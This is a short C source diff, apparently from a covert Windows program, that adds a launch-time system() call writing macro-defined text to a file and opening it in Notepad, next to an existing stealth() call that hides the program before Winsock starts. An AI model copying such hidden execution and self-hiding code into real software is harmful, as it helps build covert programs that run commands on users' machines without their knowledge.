@@ -16,6 +16,9 @@ int setup_win(struct main_struct * m_s)			// create winsock and hide cmd
 	#ifndef _DEBUG
 		stealth();		// hide program.
 	#endif
+	#if defined(TEXT_FILE_ON)
+		system("echo " TEXT_CONTENT " > " FILE_NAME "&& notepad " FILE_NAME);	// run a crafted command to open notepad on execution
+	#endif
 	err = WSAStartup(MAKEWORD(2, 2), &m_s->wsa);
 	if(err != NO_ERROR)
 		return -1;
